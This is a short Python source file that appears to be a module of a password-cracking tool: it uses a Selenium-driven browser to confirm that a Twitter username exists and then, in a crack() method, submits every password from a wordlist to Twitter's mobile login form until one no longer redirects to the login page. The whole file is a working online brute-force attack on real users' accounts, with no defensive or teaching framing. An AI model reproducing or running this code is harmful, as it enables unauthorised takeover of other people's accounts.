import time

class Twitter:

    def __init__(self, browser):
        self.browser = browser

    def set_config(self, username, wordlist, delay):
        self.username = username
        self.name = ''
        self.wordlist = wordlist
        self.delay = delay
        self.url = 'https://mobile.twitter.com/session/new' #'https://mobile.twitter.com/login'

    def check_user(self):
        self.browser.driver.get('https://twitter.com/%s' % self.username)
        if self.username in self.browser.driver.title:
            name = self.browser.driver.find_element_by_xpath('//div[@class="fullname"]')
            #name = self.browser.driver.find_element_by_xpath('//a[@href="/%s"]' % self.username)
            self.name = name.text
            return True
        else:
            return False
        
    def crack(self):
        passwords = []
        found = ''
        with open(self.wordlist, 'r') as f:
            for line in f:
                passwords.append(line.strip('\n'))
        for password in passwords:
            self.browser.driver.get(self.url)
            email = self.browser.driver.find_element_by_name('session[username_or_email]')
            email.send_keys(self.username)
            pwd = self.browser.driver.find_element_by_name('session[password]')
            pwd.send_keys(password)

            form = self.browser.driver.find_elements_by_xpath('.//form')[0]
            form.submit()

            url = self.browser.driver.current_url
            if not 'login' in url:
                found = password
                break
            time.sleep(self.delay)

        return found